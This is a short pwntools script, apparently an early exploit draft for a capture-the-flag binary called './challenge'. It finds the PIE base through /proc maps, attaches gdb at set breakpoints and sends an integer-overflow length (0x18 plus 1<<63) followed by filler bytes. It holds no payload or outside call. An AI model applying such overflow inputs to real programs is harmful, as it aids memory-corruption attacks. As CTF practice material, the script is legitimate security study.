from pwn import * 



def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(p)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(p,gdbscript=script) 

context.terminal = ['tmux', 'splitw', '-h']
with context.verbose : 
    p = process('./challenge', env={'LD_PRELOAD' : 'libc-2.23.so'}) 
    debug([0x92e, 0x963, 0x9d8])
    # p.send(str((1<<64) - 1))
    v17 = (1<<63)
    p.sendline(str(0x18 + v17))
    p.send('1' * 0x18) 

    p.interactive()